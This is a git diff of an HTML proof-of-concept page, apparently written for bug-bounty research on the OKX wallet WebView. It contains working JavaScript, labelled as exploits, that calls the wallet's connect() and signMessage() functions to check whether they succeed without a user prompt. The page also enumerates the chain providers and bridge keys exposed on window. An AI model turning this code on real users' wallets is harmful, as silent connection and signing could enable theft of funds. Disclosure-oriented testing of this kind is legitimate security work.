@@ -3,97 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana DApp PoC</title>
+    <title>OKX Security PoC</title>
     <style>
-        body { background:#1a1a2e; color:white; font-family:Arial; padding:20px; text-align:center; }
-        button { background:#ff4444; color:white; padding:15px 30px; border:none; border-radius:8px; font-size:16px; margin:20px; cursor:pointer; }
-        pre { background:#0d0d0d; padding:15px; text-align:left; font-size:12px; margin-top:20px; word-wrap:break-word; white-space:pre-wrap; }
-        #status { font-size:18px; font-weight:bold; margin:15px 0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background:#0d0d1a; color:white; font-family:Arial; padding:15px; }
+        h1 { color:#ff4444; text-align:center; font-size:20px; margin:10px 0; }
+        h2 { color:#ffaa00; font-size:14px; margin:8px 0 4px 0; }
+        .card { background:#1a1a2e; border:1px solid #333; border-radius:8px; padding:12px; margin:10px 0; }
+        .btn { display:block; width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; font-size:14px; font-weight:bold; cursor:pointer; color:white; }
+        .btn-red { background:#cc0000; }
+        .btn-orange { background:#cc6600; }
+        .btn-blue { background:#0066cc; }
+        .btn-purple { background:#660066; }
+        pre { background:#000; padding:10px; border-radius:6px; font-size:11px; margin-top:8px; word-wrap:break-word; white-space:pre-wrap; max-height:200px; overflow-y:auto; color:#00ff88; }
+        #status-bar { background:#1a1a2e; border:2px solid #ff4444; border-radius:8px; padding:10px; margin:10px 0; text-align:center; font-size:13px; color:#ffaa00; }
+        .badge { display:inline-block; padding:2px 8px; border-radius:4px; font-size:11px; margin:2px; }
+        .badge-red { background:#cc0000; }
+        .badge-gray { background:#333; }
+        .section-title { color:#ff4444; font-size:16px; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin:15px 0 8px 0; }
     </style>
 </head>
 <body>
-    <h2 style="color:#00ff88;">OKX Solana AutoApprove PoC</h2>
-    <p id="status" style="color:#ffaa00;">Loading...</p>
-    <button onclick="checkWallet()">Check Wallet</button>
-    <button onclick="testConnect()" style="background:#ff8800;">Test Connect</button>
-    <pre id="log"></pre>
 
-    <script>
-    function log(msg) {
-        document.getElementById('log').innerText += msg + '\n';
-        console.log(msg);
+<h1>🔴 OKX Security Research PoC</h1>
+<p style="text-align:center;color:#888;font-size:11px;">v6.161.0 — Bug Bounty Research</p>
+
+<div id="status-bar">🔍 Initializing...</div>
+
+<div class="card">
+    <h2>📊 Wallet Detection</h2>
+    <div id="wallet-status">Checking...</div>
+</div>
+
+<div class="section-title">🚨 CRITICAL: autoApprove=true</div>
+
+<div class="card">
+    <h2>Test 1 — Silent Connect (No Popup)</h2>
+    <button class="btn btn-red" onclick="testSilentConnect()">🔴 EXPLOIT: Silent Connect</button>
+    <pre id="log1">Press to test...</pre>
+</div>
+
+<div class="card">
+    <h2>Test 2 — Sign Message Silently</h2>
+    <button class="btn btn-red" onclick="testSignMessage()">🔴 EXPLOIT: Sign Message</button>
+    <pre id="log2">Press to test...</pre>
+</div>
+
+<div class="section-title">⛓️ Multi-Chain Exposure</div>
+
+<div class="card">
+    <h2>Test 3 — All Exposed Chains</h2>
+    <button class="btn btn-blue" onclick="testAllChains()">🔵 Check All Chains</button>
+    <pre id="log3">Press to test...</pre>
+</div>
+
+<div class="section-title">🔧 Internal Bridge</div>
+
+<div class="card">
+    <h2>Test 4 — Internal JS Bridge Access</h2>
+    <button class="btn btn-purple" onclick="testInternalBridge()">🟣 Test Internal Bridge</button>
+    <pre id="log4">Press to test...</pre>
+</div>
+
+<div class="section-title">📋 Auto Scan</div>
+<div class="card">
+    <pre id="auto-log">Running...</pre>
+</div>
+
+<script>
+function log(id, msg) {
+    var el = document.getElementById(id);
+    el.innerText += msg + '\n';
+    el.scrollTop = el.scrollHeight;
+}
+function setStatus(msg, color) {
+    var el = document.getElementById('status-bar');
+    el.innerText = msg;
+    el.style.color = color || '#ffaa00';
+}
+
+async function testSilentConnect() {
+    document.getElementById('log1').innerText = '';
+    log('log1', 'autoApprove: ' + (window.solana ? window.solana.autoApprove : 'N/A'));
+    log('log1', 'Calling connect() without user action...');
+    try {
+        const resp = await window.solana.connect();
+        log('log1', '');
+        log('log1', '[CRITICAL] CONNECTED WITHOUT POPUP!');
+        log('log1', '[CRITICAL] Public Key: ' + resp.publicKey.toString());
+        setStatus('EXPLOITED: ' + resp.publicKey.toString().substring(0,30) + '...', '#ff0000');
+    } catch(e) {
+        log('log1', '[!] Error: ' + e.message);
     }
+}
 
-    function checkWallet() {
-        log('=== Checking Wallets ===');
-
-        // Check window.solana
-        if (typeof window.solana !== 'undefined') {
-            log('[+] window.solana FOUND!');
-            log('    autoApprove: ' + window.solana.autoApprove);
-            log('    isDebug: ' + window.solana.isDebug);
-            try { log('    keys: ' + Object.keys(window.solana).join(', ')); } catch(e) {}
-            document.getElementById('status').style.color = '#ff4444';
-            document.getElementById('status').innerText = 'VULNERABLE: window.solana found!';
-        } else {
-            log('[-] window.solana: NOT FOUND');
-        }
-
-        // Check window.svm
-        if (typeof window.svm !== 'undefined') {
-            log('[+] window.svm FOUND!');
-            log('    autoApprove: ' + window.svm.autoApprove);
-            log('    isDebug: ' + window.svm.isDebug);
-        } else {
-            log('[-] window.svm: NOT FOUND');
-        }
-
-        // Check window.okxwallet
-        if (typeof window.okxwallet !== 'undefined') {
-            log('[+] window.okxwallet FOUND!');
-            try { log('    keys: ' + Object.keys(window.okxwallet).join(', ')); } catch(e) {}
-            if (window.okxwallet.solana) {
-                log('[+] window.okxwallet.solana FOUND!');
-                log('    autoApprove: ' + window.okxwallet.solana.autoApprove);
-                log('    isDebug: ' + window.okxwallet.solana.isDebug);
-            }
-        } else {
-            log('[-] window.okxwallet: NOT FOUND');
-        }
-
-        // Check _solana_
-        if (typeof window._solana_ !== 'undefined') {
-            log('[+] window._solana_ FOUND!');
-        } else {
-            log('[-] window._solana_: NOT FOUND');
-        }
+async function testSignMessage() {
+    document.getElementById('log2').innerText = '';
+    log('log2', 'Connecting first...');
+    try {
+        const resp = await window.solana.connect();
+        log('log2', 'Connected: ' + resp.publicKey.toString());
+        const msg = new TextEncoder().encode('OKX PoC - Silent Sign Test');
+        log('log2', 'Signing message silently...');
+        const signed = await window.solana.signMessage(msg, 'utf8');
+        log('log2', '[CRITICAL] SIGNED WITHOUT POPUP!');
+        log('log2', 'Sig: ' + btoa(String.fromCharCode(...signed.signature)).substring(0,40) + '...');
+        setStatus('CRITICAL: Silent signing confirmed!', '#ff0000');
+    } catch(e) {
+        log('log2', '[!] Error: ' + e.message);
     }
+}
 
-    async function testConnect() {
-        log('=== Testing Connect ===');
-        try {
-            if (typeof window.solana !== 'undefined') {
-                const resp = await window.solana.connect();
-                log('[+] Connected! pubkey: ' + resp.publicKey.toString());
-                document.getElementById('status').innerText = 'CONNECTED: ' + resp.publicKey.toString();
-            } else if (typeof window.okxwallet !== 'undefined' && window.okxwallet.solana) {
-                const resp = await window.okxwallet.solana.connect();
-                log('[+] Connected via okxwallet! pubkey: ' + resp.publicKey.toString());
-            } else {
-                log('[-] No wallet to connect');
-            }
-        } catch(e) {
-            log('[!] Error: ' + e.message);
+function testAllChains() {
+    document.getElementById('log3').innerText = '';
+    var chains = [
+        ['Solana', window.solana],
+        ['SVM', window.svm],
+        ['Bitcoin', window.okxwallet && window.okxwallet.bitcoin],
+        ['Tron', window.okxwallet && window.okxwallet.tronLink],
+        ['Aptos', window.okxwallet && window.okxwallet.aptos],
+        ['Sui', window.okxwallet && window.okxwallet.sui],
+        ['Starknet', window.okxwallet && window.okxwallet.starknet],
+        ['Ethereum', window.okxwallet],
+        ['_solana_', window._solana_],
+    ];
+    chains.forEach(function(c) {
+        if (c[1]) {
+            var extra = '';
+            if (c[1].autoApprove !== undefined) extra += ' autoApprove:' + c[1].autoApprove;
+            if (c[1].isDebug !== undefined) extra += ' isDebug:' + c[1].isDebug;
+            log('log3', '[+] ' + c[0] + extra);
+        } else {
+            log('log3', '[-] ' + c[0] + ': not found');
         }
-    }
+    });
+}
 
-    window.onload = function() {
-        document.getElementById('status').innerText = 'Page loaded - Press Check Wallet';
-        log('Page loaded at: ' + new Date().toISOString());
-        log('User Agent: ' + navigator.userAgent);
-        // Auto check after 1 second
-        setTimeout(checkWallet, 1000);
+function testInternalBridge() {
+    document.getElementById('log4').innerText = '';
+    var bridges = Object.keys(window).filter(k =>
+        k.toLowerCase().includes('okx') ||
+        k.toLowerCase().includes('bridge') ||
+        k.toLowerCase().includes('solana') ||
+        k.toLowerCase().includes('wallet')
+    );
+    bridges.forEach(k => log('log4', '[+] window.' + k));
+    if (bridges.length === 0) log('log4', 'No bridge keys found');
+}
+
+function autoScan() {
+    var r = [];
+    r.push('Time: ' + new Date().toISOString());
+    r.push('UA: ' + navigator.userAgent.substring(0,100));
+    r.push('');
+    var html = '';
+    if (window.solana) {
+        r.push('[CRITICAL] window.solana: autoApprove=' + window.solana.autoApprove + ' isDebug=' + window.solana.isDebug);
+        html += '<span class="badge badge-red">solana ✓</span>';
+        setStatus('🚨 CRITICAL: autoApprove=true in PRODUCTION!', '#ff0000');
     }
-    </script>
+    if (window.svm) {
+        r.push('[CRITICAL] window.svm: autoApprove=' + window.svm.autoApprove);
+        html += '<span class="badge badge-red">svm ✓</span>';
+    }
+    if (window.okxwallet) {
+        r.push('[+] window.okxwallet: isDebug=' + window.okxwallet.isDebug);
+        html += '<span class="badge badge-red">okxwallet ✓</span>';
+    }
+    if (window._solana_) {
+        r.push('[+] window._solana_: FOUND');
+        html += '<span class="badge badge-red">_solana_ ✓</span>';
+    }
+    if (!html) {
+        html = '<span class="badge badge-gray">Not in OKX WebView</span>';
+        setStatus('Not in OKX WebView', '#888');
+    }
+    document.getElementById('wallet-status').innerHTML = html;
+    document.getElementById('auto-log').innerText = r.join('\n');
+}
+
+window.onload = function() { setTimeout(autoScan, 600); }
+</script>
 </body>
 </html>
